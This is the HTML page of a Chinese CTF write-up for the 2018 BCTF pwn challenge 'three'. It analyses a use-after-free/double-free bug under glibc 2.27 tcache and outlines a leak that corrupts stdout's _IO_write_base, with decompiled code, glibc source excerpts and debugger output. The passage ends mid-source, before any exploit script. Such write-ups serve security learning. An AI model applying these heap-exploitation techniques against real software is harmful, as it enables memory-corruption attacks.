@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="three这道题证明了，逻辑简单的题目利用很困难（逻辑复杂的题逆向又很困难ORZ 基本逻辑程序的逻辑很简单，三个功能：alloc，edit和delete。没有输出。本题控制了最多能申请三个块。 alloc函数，申请一个0x40大小的块，并输入内容。 12345678910111213int alloc()&amp;#123;  signed int i; // [rsp+Ch] [rbp-4h]  for">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018bctf pwn">
+<meta property="og:url" content="http://0gur1.cc/2018/11/29/2018bctf-pwn/index.html">
+<meta property="og:site_name" content="0gur1">
+<meta property="og:description" content="three这道题证明了，逻辑简单的题目利用很困难（逻辑复杂的题逆向又很困难ORZ 基本逻辑程序的逻辑很简单，三个功能：alloc，edit和delete。没有输出。本题控制了最多能申请三个块。 alloc函数，申请一个0x40大小的块，并输入内容。 12345678910111213int alloc()&amp;#123;  signed int i; // [rsp+Ch] [rbp-4h]  for">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-11-29T14:17:07.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018bctf pwn">
+<meta name="twitter:description" content="three这道题证明了，逻辑简单的题目利用很困难（逻辑复杂的题逆向又很困难ORZ 基本逻辑程序的逻辑很简单，三个功能：alloc，edit和delete。没有输出。本题控制了最多能申请三个块。 alloc函数，申请一个0x40大小的块，并输入内容。 12345678910111213int alloc()&amp;#123;  signed int i; // [rsp+Ch] [rbp-4h]  for">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+	  applicationID: '7MHLMVVD1M',
+      apiKey: 'dbb74cd528079f8c1d1a6138e9ed5b67',
+      indexName: 'test_hexo',
+      hits: "",
+      labels: ""
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://0gur1.cc/2018/11/29/2018bctf-pwn/"/>
+
+
+
+
+
+  <title>2018bctf pwn | 0gur1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0gur1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  <!-- -->
+  
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/11/29/2018bctf-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0gur1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0gur1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018bctf pwn</h1>
+        
+
+        <div class="post-meta">
+		  
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-29T15:45:21+08:00">
+                2018-11-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/29/2018bctf-pwn/" class="leancloud_visitors" data-flag-title="2018bctf pwn">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,648字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="three"><a href="#three" class="headerlink" title="three"></a>three</h1><p>这道题证明了，逻辑简单的题目利用很困难（逻辑复杂的题逆向又很困难ORZ</p>
+<h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>程序的逻辑很简单，三个功能：alloc，edit和delete。没有输出。本题控制了最多能申请三个块。</p>
+<p>alloc函数，申请一个0x40大小的块，并输入内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span> &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Too many notes!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input the content:"</span>);</span><br><span class="line">  notes[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  readn(notes[i], <span class="number">64L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>edit函数，修改块中的内容。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input the idx:"</span>);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">2</span> || !notes[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No such note!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input the content:"</span>);</span><br><span class="line">  readn(notes[v1], <span class="number">64L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>delete函数，存在一点问题，如果没有输入’y’，就不对notes[i]置零，存在UAF/double free漏洞。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input the idx:"</span>);</span><br><span class="line">  LODWORD(v1) = getint();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v1 &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">2</span> &amp;&amp; notes[(<span class="keyword">signed</span> <span class="keyword">int</span>)v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)notes[(<span class="keyword">signed</span> <span class="keyword">int</span>)v1]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Clear?(y/n):"</span>, v1);</span><br><span class="line">    readn((<span class="keyword">char</span> *)&amp;v1 + <span class="number">6</span>, <span class="number">2L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( BYTE6(v1) == <span class="number">121</span> )</span><br><span class="line">      notes[(<span class="keyword">signed</span> <span class="keyword">int</span>)v1] = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No such note!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><p>delete函数中的UAF、double free漏洞。另外，给的libc版本是2.27，也就是bins中使用了tcache。虽然有UAF但是没有输出，所以泄露地址变得困难。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a><strong>泄露地址</strong></h3><p>释放一个块同时到unsortedbin和tcache中，释放到unsorted bin中的目的是获取libc相关的地址，释放到tcache则是为了利用类似于fastbin attack来修改FD指针。至于如何得到一个unsortedbin，稍稍有些复杂，思路就是在堆上伪造一个块，并能够操作size字段，使之size为0x91，然后释放7次该块，填满0x90大小的tcache。然后修改该块的大小为0x51，释放到tcache 0x50中，再修改块大小为0x91，释放时就能放入到unsorted bin中。这样，这个block既在unsortedbin里又在tcache里。</p>
+<p>由于main_arena+88是libc中的地址，通过修改最后两字节能够修改tcache中FD的指向，但只有最后1.5个字节是固定的，剩下的0.5个字节就需要碰运气了。</p>
+<p>新学到的一个思路：如果能够修改libc中stdout的<code>_IO_write_base</code>的值，由于puts会调用<code>_IO_FILE_plus-&gt;vtable</code>中的函数，从<code>_IO_write_base</code>中读数据。因此修改FD指向stdout，通过类似于fastbin attack的操作，将stdout这块交由用户输入，从而修改<code>_IO_write_base</code></p>
+<p>这里要补充一些关于puts函数的知识。在调用puts函数时，通过vtable调用了<code>_IO_new_file_xsputn</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1203</span> <span class="keyword">size_t</span></span><br><span class="line"><span class="number">1204</span>	_IO_new_file_xsputn (FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line"><span class="number">1205</span>	&#123;</span><br><span class="line"><span class="number">1206</span>	  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line"><span class="number">1207</span>	  <span class="keyword">size_t</span> to_do = n;</span><br><span class="line"><span class="number">1208</span>	  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line"><span class="number">1209</span>	  <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="number">1210</span>	</span><br><span class="line"><span class="number">1211</span>	  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="number">1212</span>	    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">1213</span>	  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">1214	     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">1215	     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"><span class="number">1216</span>	</span><br><span class="line"><span class="number">1217</span>	  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line"><span class="number">1218</span>	  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line"><span class="number">1219</span>	    &#123;</span><br><span class="line"><span class="number">1220</span>	      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line"><span class="number">1221</span>	      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line"><span class="number">1222</span>	        &#123;</span><br><span class="line"><span class="number">1223</span>	          ……</span><br><span class="line"><span class="number">1233</span>	        &#125;</span><br><span class="line"><span class="number">1234</span>	    &#125;</span><br><span class="line"><span class="number">1235</span>	  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line"><span class="number">1236</span>	    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"><span class="number">1237</span>	</span><br><span class="line"><span class="number">1238</span>	  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line"><span class="number">1239</span>	  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line"><span class="number">1240</span>	    &#123;</span><br><span class="line"><span class="number">1241</span>	      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line"><span class="number">1242</span>	        count = to_do;</span><br><span class="line"><span class="number">1243</span>	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="number">1244</span>	      s += count;</span><br><span class="line"><span class="number">1245</span>	      to_do -= count;</span><br><span class="line"><span class="number">1246</span>	    &#125;</span><br><span class="line"><span class="number">1247</span>	  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line"><span class="number">1248</span>	    &#123;</span><br><span class="line"><span class="number">1249</span>	      <span class="keyword">size_t</span> block_size, do_write;</span><br><span class="line"><span class="number">1250</span>	      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">  			  <span class="comment">//调用_IO_new_file_overflow</span></span><br><span class="line"><span class="number">1251</span>	      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="number">1252</span>	        <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">1253	           caller that everything has been written.  */</span></span><br><span class="line"><span class="number">1254</span>	        <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"><span class="number">1255</span>	</span><br><span class="line"><span class="number">1256</span>	      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line"><span class="number">1257</span>	      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line"><span class="number">1258</span>	      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"><span class="number">1259</span>	</span><br><span class="line"><span class="number">1260</span>	      <span class="keyword">if</span> (do_write)</span><br><span class="line"><span class="number">1261</span>	        &#123;</span><br><span class="line">  				  <span class="comment">//调用new_do_write</span></span><br><span class="line"><span class="number">1262</span>	          count = new_do_write (f, s, do_write);</span><br><span class="line"><span class="number">1263</span>	          to_do -= count;</span><br><span class="line"><span class="number">1264</span>	          <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line"><span class="number">1265</span>	            <span class="keyword">return</span> n - to_do;</span><br><span class="line"><span class="number">1266</span>	        &#125;</span><br><span class="line"><span class="number">1267</span>	</span><br><span class="line"><span class="number">1268</span>	      ……</span><br><span class="line"><span class="number">1273</span>	    &#125;</span><br><span class="line"><span class="number">1274</span>	  <span class="keyword">return</span> n - to_do;</span><br><span class="line"><span class="number">1275</span>	&#125;</span><br></pre></td></tr></table></figure>
+<p>函数先调用<code>_IO_OVERFLOW</code>用于flush buffer，动态调试时可以看见对应的函数为<code>_IO_new_file_overflow</code>。正常情况下，IO_FILE中的<code>_IO_read_XXX</code>，<code>_IO_write_XXX</code>，<code>_IO_buf_XXX</code>指针的值比较相近，除了<code>_IO_buf_end</code>剩下的指针值都相同。（这个是我观察的，如果不对欢迎指正！）所以在下面的函数中，调用<code>_IO_do_write</code>读取从<code>_IO_write_base</code>到<code>_IO_write_ptr</code>的内容并没有输出，因为二者的值是相同的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE *) <span class="number">0x7ffff7dd0720</span></span><br><span class="line">$<span class="number">8</span> = &#123;</span><br><span class="line">  _flags = <span class="number">-72537977</span>, </span><br><span class="line">  _IO_read_ptr = <span class="number">0x7ffff7dd07a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">  _IO_read_end = <span class="number">0x7ffff7dd07a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">  _IO_read_base = <span class="number">0x7ffff7dd07a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">  _IO_write_base = <span class="number">0x7ffff7dd07a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">  _IO_write_ptr = <span class="number">0x7ffff7dd07a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">  _IO_write_end = <span class="number">0x7ffff7dd07a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">  _IO_buf_base = <span class="number">0x7ffff7dd07a3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">"\n"</span>, </span><br><span class="line">  _IO_buf_end = <span class="number">0x7ffff7dd07a4</span> &lt;_IO_2_1_stdout_+<span class="number">132</span>&gt; <span class="string">""</span>, </span><br><span class="line">   ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">737</span> <span class="keyword">int</span></span><br><span class="line"><span class="number">738</span>	_IO_new_file_overflow (FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line"><span class="number">739</span>	&#123;</span><br><span class="line"><span class="number">740</span>	  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line"><span class="number">741</span>	    &#123;</span><br><span class="line"><span class="number">742</span>	      ……</span><br><span class="line"><span class="number">744</span>			<span class="keyword">return</span> EOF;</span><br><span class="line"><span class="number">745</span>	    &#125;</span><br><span class="line"><span class="number">746</span>	  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line"><span class="number">747</span>	  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">748</span>	    &#123;</span><br><span class="line"><span class="number">749</span>	      ……</span><br><span class="line">  		  <span class="comment">//修改_IO_XXX_XXX指针</span></span><br><span class="line"><span class="number">781</span>	    &#125;</span><br><span class="line"><span class="number">782</span>	  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">  		<span class="comment">//调用_IO_do_write读取_IO_write_ptr中的内容</span></span><br><span class="line"><span class="number">783</span>	    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"><span class="number">784</span>	                         f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line"><span class="number">785</span>	  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line"><span class="number">786</span>	    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line"><span class="number">787</span>	      <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="number">788</span>	  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line"><span class="number">789</span>	  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line"><span class="number">790</span>	      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">  		<span class="comment">//调用_IO_do_write读取_IO_write_ptr中的内容</span></span><br><span class="line"><span class="number">791</span>	    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line"><span class="number">792</span>	                      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line"><span class="number">793</span>	      <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="number">794</span>	  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line"><span class="number">795</span>	&#125;</span><br></pre></td></tr></table></figure>
+<p>接着会调用new_do_write函数。block_size = f-&gt;<code>_IO_buf_end</code> - f-&gt;<code>_IO_buf_base</code>=1，则do_write = to_do= n。</p>
+<p>在new_do_write中调用_IO_SYSWRITE，向fp中输出data（上面的s）中的to_do（上面的do_write）个字符。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">437</span> <span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line"><span class="number">438</span>	new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line"><span class="number">439</span>	&#123;</span><br><span class="line"><span class="number">440</span>	  <span class="keyword">size_t</span> count;</span><br><span class="line"><span class="number">441</span>	  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line"><span class="number">442</span>	    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">443	       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">444	       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">445	       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">446	       unpredictable. */</span></span><br><span class="line"><span class="number">447</span>	    